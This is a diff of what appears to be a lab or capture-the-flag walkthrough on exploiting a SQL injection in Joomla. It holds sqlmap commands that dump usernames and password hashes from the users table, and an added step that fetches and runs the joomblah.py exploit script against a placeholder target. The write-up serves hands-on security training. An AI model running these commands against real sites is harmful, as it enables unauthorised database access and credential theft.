@@ -120,12 +120,17 @@ Run SQLMap using the arguments specified in the exploit:
 
     sqlmap -u "http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 
-Takes ages. Instead, take a shorter route. The [users table](https://docs.joomla.org/Tables/users) may contain 
+Takes ages. The [users table](https://docs.joomla.org/Tables/users) may contain 
 credentials to access the Joomla administration section.
 
 Dump the username and password columns from the `users` table:
 
     sqlmap -u "http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C username,password -p list[fullordering] --dump
+
+This python script is specific for Joomla:
+
+    # wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
+    # python joomblah.py http://<IP address target machine>
 
 Put hash in a file named `hash.txt` and crack the hash:
 
